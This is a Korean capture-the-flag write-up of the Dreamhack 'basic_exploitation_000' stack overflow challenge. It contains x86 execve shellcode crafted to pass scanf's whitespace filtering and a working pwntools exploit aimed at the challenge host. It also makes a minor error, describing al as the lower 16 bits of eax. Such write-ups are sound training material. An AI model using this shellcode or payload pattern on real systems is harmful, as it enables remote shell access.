## 📍basic_exploitation_000

```
이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_000)의 바이너리와 소스 코드가 주어집니다.  
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
```

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

### 소스코드
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
	
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x80];
	
    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);
	
    return 0;
}
```

30초가 지나면 `alarm_handler`를 호출하고 프로그램이 종료된다.

버퍼의 시작 주소를 출력한다.
버퍼의 크기는 0x80 = 128바이트이나, 최대 141바이트까지 입력을 허용한다.
즉 13바이트를 overwrite할 수 있다.

#### 풀이

문제에서 셸을 획득하라고 하는데, 셸을 실행할 수 있는 함수가 코드에 없기 때문에 셸코드를 사용해야 한다.

문제는 32bit 아키텍처를 사용하므로, 리턴 주소는 `ebp+0x4`가 될 것이다. (`0x4` = SFP의 크기)
`scanf` 함수의 버퍼 시작 주소와 `ebp+0x4` 사이의 거리를 알아낸다.

버퍼에는 셸코드부터, 남은 바이트는 더미 데이터로 채운다.
리턴 주소에는 앞서 입력한 셸코드의 주소가 들어가도록 해 함수가 리턴되면 셸코드가 실행되도록 한다.


### 바이너리 분석

![](Attachments/AE179B09-E38A-4656-B42D-4A4B3AD02A5F.png)

`scanf`에서 사용하는 버퍼의 시작 주소는 `ebp-0x80`이다.
따라서 `ebp-0x80`부터 `0x84`, 즉 132바이트만큼을 더미 데이터로 채우면 된다.


### 익스플로잇
#### scanf() 함수로 입력을 받는 경우 shellcode를 작성할 때 주의할 점
- 입력값은 버퍼에 저장되는데, `scanf()` 함수는 공백, 탭, 개행 3가지가 나오기 전까지 입력 버퍼에 있는 값을 가져오는 함수
	- 공백, 탭, 개행
		➡️ `0x09`(Horizontal Tab), `0x0A`(Line Feed), `0x0B`(Vertical Tab), `0x0C`(Form Feed), `0x0D`(Carriage Return), `0x20`(Space)
	- **문제**: 32bit 아키텍처에서 `execve()` 시스템 콜 값 = `0x0B`
		- `0x0B`는 아스키 코드에서 Vertical Tab이므로, `0x0B` 값 뒤에 있는 코드들은 무시됨
	- **해결**: 작성한 셸코드가 `scanf()` 함수로 입력받는 경우
		- `0x09`, `0x0A`, `0x0B`, `0x0C`, `0x0D`, `0x20` 값이 셸코드에 포함되지 않도록 작성해야 함

#### 32bit 아키텍처의 execve 셸코드
##### "/bin/sh" 문자열의 리틀 엔디안 값
- `/bin/sh` = `2F 62 69 6E 2F 73 68`
- 32bit 아키텍처이므로, 4바이트씩 나눠서 스택에 push한다.
- 1번째 블록: /sh = `68 73 2F`
- 2번째 블록: /bin = `6E 69 62 2F`

##### 셸 코드
```
section .text
global _start

_start:
	xor eax, eax
	push eax
	push 0x68732F       ; /sh
	push 0x6E69622F     ; /bin
	mov ebx, esp        ; ebx = "/bin/sh"
	xor ecx, ecx
	xor edx, edx
	mov al, 0x8
	inc al
	inc al
	inc al
	int 0x80
```
- `ebx`에 실행하고자 하는 바이너리의 경로를 적어준다.
- `ecx`, `edx`에는 각각 프로그램의 인자 포인터 배열과 환경변수 포인터 배열을 적는데, 지금은 `/bin/sh`만 실행하면 되므로 0으로 만든다.
- `eax`에 시스템 콜 번호를 넣어주는데, `0x0b`는 Vertical Tab이므로 바로 넣을 수 없고, `0x0a`, `0x09`도 넣을 수 없으므로, `0x08`에서 시작해서 1씩 증가시켜 `0x0b`를 만든다.
	- `al`: `eax` 레지스터의 하위 16비트
- `int 0x80`: 프로세스가 커널에 시스템 콜을 요청한다.

##### 바이너리 추출
1. `vi execve.asm`: 셸코드 작성 후 저장
2. `nasm -f elf execve.asm`: 오브젝트 파일 생성
3. `objdump -d execve.o`: 확인 ![](Attachments/0319C5E3-7E77-4C27-B600-CCE13BB3B8FC.png)
4. `objcopy --dump-section .text=shellcode.bin execve.o`: 바이너리 파일로 변환
5. `xxd -p shellcode.bin`: 바이너리에서 hexdump 값 뽑기![](Attachments/F03271C2-D8C3-4E9C-8A40-3AFB4CACC9A3.png)

위를 셸코드 형식으로 작성한다.

`\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80`

#### pwntools를 이용한 익스플로잇 코드

```python
from pwn import *

p = remote("host3.dreamhack.games", 8235)
p.recvuntil("buf = (")

buf_addr = int(p.recv(10), 16)

shellcode = b'\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80'
payload = shellcode + b'a'*(0x84 - len(shellcode)) + p32(buf_addr)

p.send(payload)
p.interactive()
```

![](Attachments/5AB8D97B-7853-40AE-BDDF-E21425429BAF.png)

30초 제한시간이 있다는 걸 까먹고 코드를 계속 고치면서 삽질했다...

🚩